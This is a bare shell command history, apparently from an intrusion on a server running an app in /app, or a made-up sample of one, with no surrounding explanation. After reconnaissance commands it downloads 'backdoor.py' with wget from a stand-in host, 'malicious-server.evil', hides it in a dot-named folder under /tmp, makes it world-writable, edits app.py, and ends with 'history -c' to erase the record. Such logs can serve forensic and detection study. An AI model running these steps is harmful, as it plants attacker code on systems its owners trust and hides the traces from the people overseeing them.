ls -la
pwd
whoami
cd /app
cat app.py
ps aux
netstat -tulpn
ls -la /tmp
cd /tmp
wget http://malicious-server.evil/backdoor.py
ls -la
chmod +x backdoor.py
mv backdoor.py .backdoor.py
cd /app
cp app.py app.py.bak
nano app.py
cat app.py
python3 -c "import socket; print('test')"
cd /tmp
mkdir .hidden
mv .backdoor.py .hidden/
cd .hidden
ls -la
chmod 777 .backdoor.py
cd /app
cat app.py | grep import
ps aux | grep python
netstat -an | grep LISTEN
cd /home/appuser
history | tail -20
history -c